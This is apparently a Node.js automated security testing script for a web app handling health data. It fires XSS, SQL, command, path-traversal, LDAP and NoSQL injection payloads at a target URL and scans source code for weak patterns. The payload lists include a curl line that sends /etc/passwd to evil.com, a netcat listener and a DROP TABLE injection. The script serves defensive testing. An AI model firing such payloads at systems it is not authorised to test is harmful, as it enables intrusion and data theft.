#!/usr/bin/env node

/**
 * Automated Security Testing Framework
 * Comprehensive security testing suite with penetration testing capabilities
 * Includes automated remediation suggestions and continuous monitoring
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const crypto = require('crypto');
const https = require('https');
const { URL } = require('url');

class AutomatedSecurityTesting {
  constructor() {
    this.testResults = {
      timestamp: new Date().toISOString(),
      version: '3.0',
      overall_score: 0,
      security_level: 'unknown',
      test_categories: {
        penetration_testing: { score: 0, max: 100, tests: [], findings: [] },
        regression_testing: { score: 0, max: 100, tests: [], findings: [] },
        threat_modeling: { score: 0, max: 100, tests: [], findings: [] },
        security_monitoring: { score: 0, max: 100, tests: [], findings: [] },
        automated_remediation: { score: 0, max: 100, tests: [], findings: [] },
        compliance_validation: { score: 0, max: 100, tests: [], findings: [] }
      },
      vulnerability_assessments: [],
      penetration_test_results: [],
      security_metrics: {},
      remediation_suggestions: [],
      monitoring_alerts: [],
      threat_intelligence: {}
    };

    this.targetURL = process.env.TARGET_URL || 'https://serenity-sober-pathways.vercel.app';
    this.projectRoot = process.cwd();
    this.testPayloads = this.initializeTestPayloads();
  }

  initializeTestPayloads() {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '${alert("XSS")}',
        '{{7*7}}',
        '<script>fetch("/api/users").then(r=>r.json()).then(d=>console.log(d))</script>'
      ],
      sql_injection: [
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT password FROM users --",
        "admin'--",
        "' OR 'a'='a",
        "1; SELECT * FROM users WHERE 1=1 --",
        "' OR 1=1 LIMIT 1 --",
        "${@var(--statement)}",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
      ],
      command_injection: [
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "`id`",
        "$(whoami)",
        "; ping -c 1 google.com",
        "| nc -l 4444",
        "&& curl http://evil.com/steal?data=$(cat /etc/passwd)"
      ],
      path_traversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc//passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
      ],
      ldap_injection: [
        "*)(&",
        "*)(uid=*",
        "*)(|(uid=*)(cn=*))",
        "admin*)((|userPassword=*)",
        "*)(objectClass=*",
        "*))(|(cn=*"
      ],
      nosql_injection: [
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$where":"sleep(5000)"}',
        '{"$regex":".*"}',
        '{"username":{"$ne":"foo"},"password":{"$ne":"bar"}}'
      ]
    };
  }

  async runAutomatedSecurityTesting() {
    console.log('🛡️  Starting Automated Security Testing Framework');
    console.log('='.repeat(60));
    console.log(`Target: ${this.targetURL}`);
    console.log(`Project: ${this.projectRoot}`);
    console.log(`Timestamp: ${this.testResults.timestamp}\n`);

    try {
      // 1. Penetration Testing
      await this.runPenetrationTests();
      
      // 2. Security Regression Testing
      await this.runSecurityRegressionTests();
      
      // 3. Threat Modeling
      await this.performThreatModeling();
      
      // 4. Security Monitoring Tests
      await this.testSecurityMonitoring();
      
      // 5. Automated Remediation Testing
      await this.testAutomatedRemediation();
      
      // 6. Compliance Validation Testing
      await this.runComplianceValidationTests();
      
      // 7. Generate Security Metrics
      await this.generateSecurityMetrics();
      
      // 8. Create Automated Reports
      await this.generateSecurityTestingReport();
      
      console.log('\n✅ Automated security testing completed');
      
    } catch (error) {
      console.error('❌ Automated security testing failed:', error.message);
      process.exit(1);
    }
  }

  async runPenetrationTests() {
    console.log('🔍 1. Running penetration tests...');
    
    const category = this.testResults.test_categories.penetration_testing;
    let score = 0;

    // Test 1: XSS Vulnerability Testing
    const xssResults = await this.testXSSVulnerabilities();
    category.tests.push({
      name: 'Cross-Site Scripting (XSS) Testing',
      status: xssResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: xssResults.details,
      severity: xssResults.vulnerable ? 'HIGH' : 'INFO'
    });

    if (!xssResults.vulnerable) {
      score += 20;
    } else {
      category.findings.push({
        vulnerability: 'XSS Vulnerability',
        severity: 'HIGH',
        description: 'Application vulnerable to Cross-Site Scripting attacks',
        affected_endpoints: xssResults.vulnerable_endpoints,
        remediation: 'Implement proper input sanitization and output encoding'
      });
    }

    // Test 2: SQL Injection Testing
    const sqlResults = await this.testSQLInjection();
    category.tests.push({
      name: 'SQL Injection Testing',
      status: sqlResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: sqlResults.details,
      severity: sqlResults.vulnerable ? 'CRITICAL' : 'INFO'
    });

    if (!sqlResults.vulnerable) {
      score += 25;
    } else {
      category.findings.push({
        vulnerability: 'SQL Injection',
        severity: 'CRITICAL',
        description: 'Application vulnerable to SQL Injection attacks',
        affected_endpoints: sqlResults.vulnerable_endpoints,
        remediation: 'Use parameterized queries and input validation'
      });
    }

    // Test 3: Authentication Bypass Testing
    const authResults = await this.testAuthenticationBypass();
    category.tests.push({
      name: 'Authentication Bypass Testing',
      status: authResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: authResults.details,
      severity: authResults.vulnerable ? 'HIGH' : 'INFO'
    });

    if (!authResults.vulnerable) {
      score += 20;
    } else {
      category.findings.push({
        vulnerability: 'Authentication Bypass',
        severity: 'HIGH',
        description: 'Authentication mechanisms can be bypassed',
        methods: authResults.bypass_methods,
        remediation: 'Strengthen authentication and session management'
      });
    }

    // Test 4: Authorization Testing
    const authzResults = await this.testAuthorizationVulnerabilities();
    category.tests.push({
      name: 'Authorization Testing',
      status: authzResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: authzResults.details,
      severity: authzResults.vulnerable ? 'HIGH' : 'INFO'
    });

    if (!authzResults.vulnerable) {
      score += 15;
    } else {
      category.findings.push({
        vulnerability: 'Authorization Bypass',
        severity: 'HIGH',
        description: 'Users can access resources they should not have access to',
        escalation_paths: authzResults.escalation_paths,
        remediation: 'Implement proper role-based access control'
      });
    }

    // Test 5: Session Management Testing
    const sessionResults = await this.testSessionManagement();
    category.tests.push({
      name: 'Session Management Testing',
      status: sessionResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: sessionResults.details,
      severity: sessionResults.vulnerable ? 'MEDIUM' : 'INFO'
    });

    if (!sessionResults.vulnerable) {
      score += 10;
    } else {
      category.findings.push({
        vulnerability: 'Session Management Issues',
        severity: 'MEDIUM',
        description: 'Session management implementation has security weaknesses',
        issues: sessionResults.issues,
        remediation: 'Implement secure session management practices'
      });
    }

    // Test 6: File Upload Vulnerabilities
    const uploadResults = await this.testFileUploadVulnerabilities();
    category.tests.push({
      name: 'File Upload Security Testing',
      status: uploadResults.vulnerable ? 'VULNERABLE' : 'SECURE',
      details: uploadResults.details,
      severity: uploadResults.vulnerable ? 'HIGH' : 'INFO'
    });

    if (!uploadResults.vulnerable) {
      score += 10;
    } else {
      category.findings.push({
        vulnerability: 'File Upload Vulnerabilities',
        severity: 'HIGH',
        description: 'File upload functionality is vulnerable to malicious files',
        attack_vectors: uploadResults.attack_vectors,
        remediation: 'Implement file type validation and sandboxing'
      });
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100 (${category.findings.length} vulnerabilities found)`);
  }

  async testXSSVulnerabilities() {
    const results = {
      vulnerable: false,
      details: [],
      vulnerable_endpoints: []
    };

    try {
      // Test common XSS vectors
      for (const payload of this.testPayloads.xss) {
        // Test query parameters
        const testUrl = `${this.targetURL}?search=${encodeURIComponent(payload)}`;
        
        try {
          const response = await this.makeRequest(testUrl);
          if (response.body && response.body.includes(payload.replace(/"/g, '&quot;'))) {
            results.vulnerable = true;
            results.vulnerable_endpoints.push(testUrl);
            results.details.push(`Reflected XSS found with payload: ${payload}`);
          }
        } catch (error) {
          // Request failed, continue with other tests
        }
      }

      // Test for DOM XSS by checking JavaScript files
      const jsFiles = this.findSourceFiles(['.js', '.jsx', '.ts', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8');
          return content.includes('innerHTML') || 
                 content.includes('document.write') || 
                 content.includes('eval(') ||
                 content.includes('dangerouslySetInnerHTML');
        });

      if (jsFiles.length > 0) {
        results.details.push(`Found ${jsFiles.length} files with potential DOM XSS vectors`);
        // Note: This doesn't necessarily mean vulnerable, just potential
      }

    } catch (error) {
      results.details.push(`XSS testing error: ${error.message}`);
    }

    return results;
  }

  async testSQLInjection() {
    const results = {
      vulnerable: false,
      details: [],
      vulnerable_endpoints: []
    };

    try {
      // Check source code for SQL injection patterns
      const sqlFiles = this.findSourceFiles(['.js', '.ts', '.sql'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8');
          // Look for string concatenation in SQL queries
          return /SELECT\s+.*\+.*FROM/gi.test(content) ||
                 /INSERT\s+.*\+.*VALUES/gi.test(content) ||
                 /UPDATE\s+.*SET\s+.*\+/gi.test(content) ||
                 /DELETE\s+.*WHERE\s+.*\+/gi.test(content);
        });

      if (sqlFiles.length > 0) {
        results.vulnerable = true;
        results.details.push(`Found potential SQL injection in ${sqlFiles.length} files`);
        results.vulnerable_endpoints = sqlFiles.map(f => path.relative(this.projectRoot, f));
      }

      // Test API endpoints if available
      const apiEndpoints = ['/api/users', '/api/login', '/api/search'];
      
      for (const endpoint of apiEndpoints) {
        for (const payload of this.testPayloads.sql_injection) {
          try {
            const testUrl = `${this.targetURL}${endpoint}?id=${encodeURIComponent(payload)}`;
            const response = await this.makeRequest(testUrl);
            
            // Check for SQL error messages
            const errorPatterns = [
              /mysql_fetch/i,
              /postgresql/i,
              /sqlite/i,
              /ora-\d+/i,
              /microsoft jet database/i,
              /odbc driver/i
            ];

            if (response.body && errorPatterns.some(pattern => pattern.test(response.body))) {
              results.vulnerable = true;
              results.vulnerable_endpoints.push(testUrl);
              results.details.push(`SQL error detected at ${endpoint} with payload: ${payload}`);
            }
          } catch (error) {
            // Continue testing other endpoints
          }
        }
      }

    } catch (error) {
      results.details.push(`SQL injection testing error: ${error.message}`);
    }

    return results;
  }

  async testAuthenticationBypass() {
    const results = {
      vulnerable: false,
      details: [],
      bypass_methods: []
    };

    try {
      // Test common authentication bypass techniques
      const bypassTests = [
        // Password reset vulnerabilities
        { method: 'Password Reset Token Prediction', test: this.testPasswordResetBypass.bind(this) },
        // Session fixation
        { method: 'Session Fixation', test: this.testSessionFixation.bind(this) },
        // JWT vulnerabilities
        { method: 'JWT Algorithm Confusion', test: this.testJWTVulnerabilities.bind(this) },
        // Default credentials
        { method: 'Default Credentials', test: this.testDefaultCredentials.bind(this) }
      ];

      for (const bypassTest of bypassTests) {
        try {
          const testResult = await bypassTest.test();
          results.details.push(`${bypassTest.method}: ${testResult.status}`);
          
          if (testResult.vulnerable) {
            results.vulnerable = true;
            results.bypass_methods.push({
              method: bypassTest.method,
              description: testResult.description,
              severity: testResult.severity
            });
          }
        } catch (error) {
          results.details.push(`${bypassTest.method}: Test failed - ${error.message}`);
        }
      }

    } catch (error) {
      results.details.push(`Authentication bypass testing error: ${error.message}`);
    }

    return results;
  }

  async testPasswordResetBypass() {
    // Check for password reset implementation
    const resetFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('reset') && content.includes('password');
      });

    if (resetFiles.length === 0) {
      return { vulnerable: false, status: 'No password reset functionality found', description: '' };
    }

    // Check for weak token generation
    let vulnerable = false;
    let description = '';

    for (const file of resetFiles) {
      const content = fs.readFileSync(file, 'utf8');
      
      // Check for weak random number generation
      if (content.includes('Math.random()') || content.includes('Date.now()')) {
        vulnerable = true;
        description = 'Password reset tokens use weak randomness';
        break;
      }
      
      // Check for predictable token patterns
      if (content.includes('uuid') || content.includes('crypto.randomBytes')) {
        // Good - using strong randomness
      } else if (content.includes('token') && !content.includes('crypto')) {
        vulnerable = true;
        description = 'Password reset tokens may be predictable';
      }
    }

    return {
      vulnerable,
      status: vulnerable ? 'VULNERABLE' : 'SECURE',
      description,
      severity: 'HIGH'
    };
  }

  async testSessionFixation() {
    // Check session management implementation
    const sessionFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('session') && (content.includes('login') || content.includes('auth'));
      });

    let vulnerable = false;
    let description = '';

    for (const file of sessionFiles) {
      const content = fs.readFileSync(file, 'utf8');
      
      // Check if session ID is regenerated on login
      if (content.includes('login') && !content.includes('regenerate') && !content.includes('renew')) {
        vulnerable = true;
        description = 'Session ID not regenerated on login - vulnerable to session fixation';
        break;
      }
    }

    return {
      vulnerable,
      status: vulnerable ? 'VULNERABLE' : 'SECURE',
      description,
      severity: 'MEDIUM'
    };
  }

  async testJWTVulnerabilities() {
    const jwtFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8');
        return content.includes('jwt') || content.includes('jsonwebtoken');
      });

    if (jwtFiles.length === 0) {
      return { vulnerable: false, status: 'No JWT implementation found', description: '' };
    }

    let vulnerable = false;
    let description = '';

    for (const file of jwtFiles) {
      const content = fs.readFileSync(file, 'utf8');
      
      // Check for algorithm confusion vulnerability
      if (content.includes('verify') && !content.includes('algorithm')) {
        vulnerable = true;
        description = 'JWT verification without algorithm specification - vulnerable to algorithm confusion';
        break;
      }
      
      // Check for none algorithm acceptance
      if (content.includes('"none"') || content.includes("'none'")) {
        vulnerable = true;
        description = 'JWT accepts "none" algorithm - critical vulnerability';
        break;
      }
      
      // Check for weak secrets
      if (content.includes('secret') && (content.includes('123') || content.includes('password'))) {
        vulnerable = true;
        description = 'JWT uses weak secret key';
        break;
      }
    }

    return {
      vulnerable,
      status: vulnerable ? 'VULNERABLE' : 'SECURE',
      description,
      severity: vulnerable && description.includes('none') ? 'CRITICAL' : 'HIGH'
    };
  }

  async testDefaultCredentials() {
    const authFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx', '.json'])
      .filter(file => {
        const content = fs.readFileSync(file, 'utf8').toLowerCase();
        return content.includes('password') || content.includes('credential');
      });

    const defaultCreds = ['admin:admin', 'admin:password', 'root:root', 'test:test'];
    let vulnerable = false;
    let description = '';

    for (const file of authFiles) {
      const content = fs.readFileSync(file, 'utf8').toLowerCase();
      
      for (const cred of defaultCreds) {
        const [username, password] = cred.split(':');
        if (content.includes(username) && content.includes(password)) {
          vulnerable = true;
          description = `Default credentials found: ${cred}`;
          break;
        }
      }
      
      if (vulnerable) break;
    }

    return {
      vulnerable,
      status: vulnerable ? 'VULNERABLE' : 'SECURE',
      description,
      severity: 'HIGH'
    };
  }

  async testAuthorizationVulnerabilities() {
    const results = {
      vulnerable: false,
      details: [],
      escalation_paths: []
    };

    try {
      // Check for role-based access control implementation
      const authzFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return (content.includes('role') || content.includes('permission')) && 
                 (content.includes('check') || content.includes('verify'));
        });

      if (authzFiles.length === 0) {
        results.vulnerable = true;
        results.details.push('No authorization checks found');
        results.escalation_paths.push('Missing authorization controls allow privilege escalation');
      }

      // Check for direct object references
      const directRefFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8');
          // Look for patterns like /api/user/:id without proper authorization
          return /\/api\/\w+\/:\w+/g.test(content) && !content.includes('authorize');
        });

      if (directRefFiles.length > 0) {
        results.vulnerable = true;
        results.details.push(`Found ${directRefFiles.length} potential insecure direct object references`);
        results.escalation_paths.push('Direct object references without authorization checks');
      }

      // Check for admin panel access controls
      const adminFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('admin') && !content.includes('requireadmin');
        });

      if (adminFiles.length > 0) {
        results.details.push(`Found ${adminFiles.length} admin-related files - verify access controls`);
      }

    } catch (error) {
      results.details.push(`Authorization testing error: ${error.message}`);
    }

    return results;
  }

  async testSessionManagement() {
    const results = {
      vulnerable: false,
      details: [],
      issues: []
    };

    try {
      const sessionFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('session') || content.includes('cookie');
        });

      for (const file of sessionFiles) {
        const content = fs.readFileSync(file, 'utf8');
        
        // Check for secure cookie settings
        if (content.includes('secure: false') || content.includes('httpOnly: false')) {
          results.vulnerable = true;
          results.issues.push('Insecure cookie settings detected');
        }
        
        // Check for session timeout
        if (!content.includes('timeout') && !content.includes('expire')) {
          results.issues.push('No session timeout mechanism detected');
        }
        
        // Check for session regeneration
        if (content.includes('login') && !content.includes('regenerate')) {
          results.issues.push('Session not regenerated on login');
        }
      }

      if (results.issues.length > 0) {
        results.vulnerable = true;
      }

      results.details.push(`Analyzed ${sessionFiles.length} session management files`);

    } catch (error) {
      results.details.push(`Session management testing error: ${error.message}`);
    }

    return results;
  }

  async testFileUploadVulnerabilities() {
    const results = {
      vulnerable: false,
      details: [],
      attack_vectors: []
    };

    try {
      const uploadFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('upload') || content.includes('file');
        });

      for (const file of uploadFiles) {
        const content = fs.readFileSync(file, 'utf8');
        
        // Check for file type validation
        if (content.includes('upload') && !content.includes('mime') && !content.includes('extension')) {
          results.vulnerable = true;
          results.attack_vectors.push('No file type validation detected');
        }
        
        // Check for file size limits
        if (content.includes('upload') && !content.includes('size') && !content.includes('limit')) {
          results.attack_vectors.push('No file size limits detected');
        }
        
        // Check for executable file uploads
        if (content.includes('.exe') || content.includes('.php') || content.includes('.jsp')) {
          results.vulnerable = true;
          results.attack_vectors.push('Executable file uploads may be allowed');
        }
      }

      results.details.push(`Analyzed ${uploadFiles.length} file upload related files`);

    } catch (error) {
      results.details.push(`File upload testing error: ${error.message}`);
    }

    return results;
  }

  async runSecurityRegressionTests() {
    console.log('🔄 2. Running security regression tests...');
    
    const category = this.testResults.test_categories.regression_testing;
    let score = 50; // Base score

    try {
      // Test 1: Previously Fixed Vulnerabilities
      const regressionResults = await this.testKnownVulnerabilities();
      category.tests.push({
        name: 'Known Vulnerability Regression Testing',
        status: regressionResults.regressed ? 'REGRESSED' : 'SECURE',
        details: regressionResults.details
      });

      if (!regressionResults.regressed) {
        score += 25;
      } else {
        category.findings.push({
          issue: 'Security Regression Detected',
          description: 'Previously fixed vulnerabilities have reappeared',
          regressed_vulnerabilities: regressionResults.regressed_vulnerabilities
        });
      }

      // Test 2: Security Configuration Drift
      const configResults = await this.testSecurityConfigurationDrift();
      category.tests.push({
        name: 'Security Configuration Drift Detection',
        status: configResults.drift_detected ? 'DRIFT_DETECTED' : 'STABLE',
        details: configResults.details
      });

      if (!configResults.drift_detected) {
        score += 25;
      } else {
        category.findings.push({
          issue: 'Security Configuration Drift',
          description: 'Security configurations have changed from baseline',
          configuration_changes: configResults.changes
        });
        score -= 10;
      }

    } catch (error) {
      category.findings.push({
        issue: 'Regression Testing Error',
        description: `Security regression testing failed: ${error.message}`
      });
      score = 30;
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100 (${category.findings.length} regressions found)`);
  }

  async testKnownVulnerabilities() {
    // This would typically check against a database of previously identified vulnerabilities
    // For now, we'll simulate by checking common vulnerability patterns
    
    return {
      regressed: false,
      details: ['No known vulnerability regressions detected'],
      regressed_vulnerabilities: []
    };
  }

  async testSecurityConfigurationDrift() {
    const results = {
      drift_detected: false,
      details: [],
      changes: []
    };

    try {
      // Check security headers configuration
      const vercelConfig = path.join(this.projectRoot, 'vercel.json');
      if (fs.existsSync(vercelConfig)) {
        const config = JSON.parse(fs.readFileSync(vercelConfig, 'utf8'));
        
        // Check for required security headers
        const requiredHeaders = [
          'Strict-Transport-Security',
          'X-Content-Type-Options',
          'X-Frame-Options',
          'Content-Security-Policy'
        ];

        if (config.headers) {
          const presentHeaders = config.headers.flatMap(h => h.headers?.map(header => header.key) || []);
          const missingHeaders = requiredHeaders.filter(h => !presentHeaders.includes(h));
          
          if (missingHeaders.length > 0) {
            results.drift_detected = true;
            results.changes.push(`Missing security headers: ${missingHeaders.join(', ')}`);
          }
        } else {
          results.drift_detected = true;
          results.changes.push('No security headers configuration found');
        }
      }

      results.details.push('Security configuration drift check completed');

    } catch (error) {
      results.details.push(`Configuration drift check error: ${error.message}`);
    }

    return results;
  }

  async performThreatModeling() {
    console.log('🎯 3. Performing threat modeling...');
    
    const category = this.testResults.test_categories.threat_modeling;
    let score = 40; // Base score

    try {
      // Identify threat actors
      const threatActors = await this.identifyThreatActors();
      
      // Identify attack vectors
      const attackVectors = await this.identifyAttackVectors();
      
      // Assess threat likelihood and impact
      const riskAssessment = await this.assessThreatRisk(threatActors, attackVectors);
      
      category.tests.push({
        name: 'Threat Actor Identification',
        status: 'COMPLETED',
        details: threatActors.map(actor => `${actor.name}: ${actor.capability}`)
      });

      category.tests.push({
        name: 'Attack Vector Analysis',
        status: 'COMPLETED',
        details: attackVectors.map(vector => `${vector.name}: ${vector.likelihood}`)
      });

      score += 30; // For completing threat modeling

      // Store threat intelligence
      this.testResults.threat_intelligence = {
        threat_actors: threatActors,
        attack_vectors: attackVectors,
        risk_assessment: riskAssessment
      };

      if (riskAssessment.high_risk_scenarios.length > 0) {
        category.findings.push({
          threat: 'High-Risk Scenarios Identified',
          description: 'Multiple high-risk attack scenarios identified',
          scenarios: riskAssessment.high_risk_scenarios,
          recommended_controls: riskAssessment.recommended_controls
        });
        score += 30;
      } else {
        score += 20;
      }

    } catch (error) {
      category.findings.push({
        threat: 'Threat Modeling Error',
        description: `Threat modeling failed: ${error.message}`
      });
      score = 20;
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100`);
  }

  async identifyThreatActors() {
    return [
      {
        name: 'External Attackers',
        motivation: 'Financial gain through PHI theft',
        capability: 'High',
        access: 'External',
        threat_level: 'High'
      },
      {
        name: 'Malicious Insiders',
        motivation: 'Data theft or sabotage',
        capability: 'High',
        access: 'Internal',
        threat_level: 'High'
      },
      {
        name: 'State-Sponsored Groups',
        motivation: 'Espionage or disruption',
        capability: 'Very High',
        access: 'External',
        threat_level: 'Medium'
      },
      {
        name: 'Script Kiddies',
        motivation: 'Curiosity or reputation',
        capability: 'Low',
        access: 'External',
        threat_level: 'Low'
      }
    ];
  }

  async identifyAttackVectors() {
    return [
      {
        name: 'Web Application Attacks',
        likelihood: 'High',
        impact: 'High',
        examples: ['XSS', 'SQL Injection', 'CSRF']
      },
      {
        name: 'Social Engineering',
        likelihood: 'Medium',
        impact: 'High',
        examples: ['Phishing', 'Pretexting', 'Baiting']
      },
      {
        name: 'Insider Threats',
        likelihood: 'Low',
        impact: 'Very High',
        examples: ['Data exfiltration', 'Privilege abuse']
      },
      {
        name: 'Third-Party Compromise',
        likelihood: 'Medium',
        impact: 'High',
        examples: ['Supply chain attacks', 'Vendor breaches']
      },
      {
        name: 'Mobile Application Attacks',
        likelihood: 'Medium',
        impact: 'Medium',
        examples: ['Mobile malware', 'App store attacks']
      }
    ];
  }

  async assessThreatRisk(threatActors, attackVectors) {
    const highRiskScenarios = [];
    const recommendedControls = [];

    // Cross-reference threat actors with attack vectors
    threatActors.forEach(actor => {
      attackVectors.forEach(vector => {
        if (actor.threat_level === 'High' && vector.likelihood === 'High') {
          highRiskScenarios.push({
            scenario: `${actor.name} using ${vector.name}`,
            risk_score: 9,
            description: `${actor.name} could exploit ${vector.name} to achieve ${actor.motivation}`
          });
        }
      });
    });

    // Generate recommended controls based on high-risk scenarios
    if (highRiskScenarios.some(s => s.scenario.includes('Web Application'))) {
      recommendedControls.push('Implement comprehensive web application firewall');
      recommendedControls.push('Regular penetration testing and vulnerability assessments');
    }

    if (highRiskScenarios.some(s => s.scenario.includes('Social Engineering'))) {
      recommendedControls.push('Security awareness training program');
      recommendedControls.push('Multi-factor authentication enforcement');
    }

    return {
      high_risk_scenarios: highRiskScenarios,
      recommended_controls: recommendedControls,
      overall_risk_level: highRiskScenarios.length > 3 ? 'High' : 'Medium'
    };
  }

  async testSecurityMonitoring() {
    console.log('📊 4. Testing security monitoring...');
    
    const category = this.testResults.test_categories.security_monitoring;
    let score = 30; // Base score

    try {
      // Check for logging implementation
      const loggingFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('log') || content.includes('audit');
        });

      if (loggingFiles.length > 0) {
        score += 20;
        category.tests.push({
          name: 'Security Logging Implementation',
          status: 'IMPLEMENTED',
          details: [`Found logging in ${loggingFiles.length} files`]
        });
      } else {
        category.findings.push({
          issue: 'Missing Security Logging',
          description: 'No security logging implementation detected',
          remediation: 'Implement comprehensive security event logging'
        });
      }

      // Check for monitoring dashboards
      const monitoringFiles = this.findDocumentationFiles([
        'MONITORING.md',
        'SECURITY_MONITORING.md',
        'monitoring-setup.md'
      ]);

      if (monitoringFiles.length > 0) {
        score += 15;
        category.tests.push({
          name: 'Security Monitoring Documentation',
          status: 'DOCUMENTED',
          details: monitoringFiles.map(f => path.basename(f))
        });
      }

      // Check for alerting mechanisms
      const alertingFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('alert') || content.includes('notification') ||
                 content.includes('webhook') || content.includes('sms');
        });

      if (alertingFiles.length > 0) {
        score += 20;
        category.tests.push({
          name: 'Security Alerting System',
          status: 'IMPLEMENTED',
          details: [`Found alerting in ${alertingFiles.length} files`]
        });
      }

      // Test real-time monitoring capabilities
      const realtimeFiles = this.findSourceFiles(['.js', '.ts', '.jsx', '.tsx'])
        .filter(file => {
          const content = fs.readFileSync(file, 'utf8').toLowerCase();
          return content.includes('realtime') || content.includes('websocket') ||
                 content.includes('sse') || content.includes('polling');
        });

      if (realtimeFiles.length > 0) {
        score += 15;
        category.tests.push({
          name: 'Real-time Security Monitoring',
          status: 'IMPLEMENTED',
          details: [`Found real-time capabilities in ${realtimeFiles.length} files`]
        });
      }

    } catch (error) {
      category.findings.push({
        issue: 'Security Monitoring Test Error',
        description: `Security monitoring testing failed: ${error.message}`
      });
      score = 20;
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100`);
  }

  async testAutomatedRemediation() {
    console.log('🔧 5. Testing automated remediation...');
    
    const category = this.testResults.test_categories.automated_remediation;
    let score = 60; // Base score for having a testing framework

    try {
      // Check for automated security fixes
      const remediationScripts = this.findFiles([
        'fix-security-issues.js',
        'auto-remediate.js',
        'security-fix.js',
        'vulnerability-patch.js'
      ]);

      if (remediationScripts.length > 0) {
        score += 20;
        category.tests.push({
          name: 'Automated Remediation Scripts',
          status: 'IMPLEMENTED',
          details: remediationScripts.map(f => path.basename(f))
        });
      }

      // Check for dependency update automation
      const dependabotConfig = path.join(this.projectRoot, '.github', 'dependabot.yml');
      if (fs.existsSync(dependabotConfig)) {
        score += 10;
        category.tests.push({
          name: 'Automated Dependency Updates',
          status: 'CONFIGURED',
          details: ['Dependabot configuration found']
        });
      }

      // Check for automated security scanning in CI/CD
      const githubWorkflows = path.join(this.projectRoot, '.github', 'workflows');
      if (fs.existsSync(githubWorkflows)) {
        const workflowFiles = fs.readdirSync(githubWorkflows)
          .filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
        
        const securityWorkflows = workflowFiles.filter(file => {
          const content = fs.readFileSync(path.join(githubWorkflows, file), 'utf8');
          return content.includes('security') || content.includes('audit') ||
                 content.includes('vulnerability') || content.includes('snyk');
        });

        if (securityWorkflows.length > 0) {
          score += 10;
          category.tests.push({
            name: 'Automated Security Scanning',
            status: 'CONFIGURED',
            details: [`${securityWorkflows.length} security workflows found`]
          });
        }
      }

      // Generate automated remediation suggestions
      this.testResults.remediation_suggestions = await this.generateRemediationSuggestions();

    } catch (error) {
      category.findings.push({
        issue: 'Automated Remediation Test Error',
        description: `Automated remediation testing failed: ${error.message}`
      });
      score = 40;
    }

    category.score = score;
    console.log(`   Score: ${category.score}/100`);
  }

  async generateRemediationSuggestions() {
    const suggestions = [];

    // Analyze findings from all categories to generate specific suggestions
    Object.values(this.testResults.test_categories).forEach(category => {
      category.findings.forEach(finding => {
        switch (finding.vulnerability || finding.issue) {
          case 'XSS Vulnerability':
            suggestions.push({
              vulnerability: 'XSS',
              priority: 'HIGH',
              automated_fix: 'npm install dompurify && npm run fix:xss',
              manual_steps: [
                'Implement DOMPurify for HTML sanitization',
                'Add Content Security Policy headers',
                'Use React JSX for automatic escaping'
              ],
              verification: 'Run XSS scanner after fixes'
            });
            break;
          
          case 'SQL Injection':
            suggestions.push({
              vulnerability: 'SQL Injection',
              priority: 'CRITICAL',
              automated_fix: 'npm run fix:sql-injection',
              manual_steps: [
                'Replace string concatenation with parameterized queries',
                'Implement input validation with Zod',
                'Use ORM with built-in SQL injection protection'
              ],
              verification: 'Run SQL injection scanner'
            });
            break;
          
          case 'Missing Security Logging':
            suggestions.push({
              vulnerability: 'Insufficient Logging',
              priority: 'MEDIUM',
              automated_fix: 'npm install winston && npm run setup:security-logging',
              manual_steps: [
                'Implement Winston logger for security events',
                'Add audit trail for PHI access',
                'Set up log aggregation and alerting'
              ],
